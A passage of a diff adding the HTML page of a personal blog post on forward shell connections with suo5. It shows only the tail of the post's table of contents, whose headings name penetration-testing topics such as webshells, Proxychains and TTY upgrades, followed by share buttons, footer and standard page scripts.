Shell：绕过 -e 限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%A9%BF%E9%80%8F%E5%9C%B0%E9%81%93%EF%BC%9AProxychains-%E7%9A%84%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x03 穿透地道：Proxychains 的降维打击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E4%BA%A4%E4%BA%92%E5%8D%87%E7%BA%A7%EF%BC%9A%E4%BB%8E-Web-%E5%88%B0-TTY"><span class="toc-number">1.1.5.</span> <span class="toc-text">0x04 交互升级：从 Web 到 TTY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.6.</span> <span class="toc-text">0x05 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.</span> <span class="toc-text">举例演示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8C%E6%8B%BF%E5%88%B0webshell"><span class="toc-number">1.2.1.</span> <span class="toc-text">写入一句话木马，拿到webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">✅ 正确的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%AF%B9-%E8%BF%9B%E8%A1%8C%E8%BD%AC%E4%B9%89%EF%BC%88%E6%9C%80%E7%9B%B4%E6%8E%A5%EF%BC%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">方法一：对 $ 进行转义（最直接）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9ABase64-%E7%BC%96%E7%A0%81%E5%86%99%E5%85%A5%EF%BC%88%E6%9C%80%E7%A8%B3%E5%A6%A5%EF%BC%8C%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%EF%BC%89-%F0%9F%8C%9F"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">方法二：Base64 编码写入（最稳妥，强烈推荐） 🌟</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">下载相关文件</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&text=我的第一篇github博客文章"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&is_video=false&description=我的第一篇github博客文章"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=我的第一篇github博客文章&body=Check out this article: https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&title=我的第一篇github博客文章"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&name=我的第一篇github博客文章&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://mooi-max.github.io/2026/03/15/%E5%88%A9%E7%94%A8suo5%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell/&t=我的第一篇github博客文章"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+	  <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
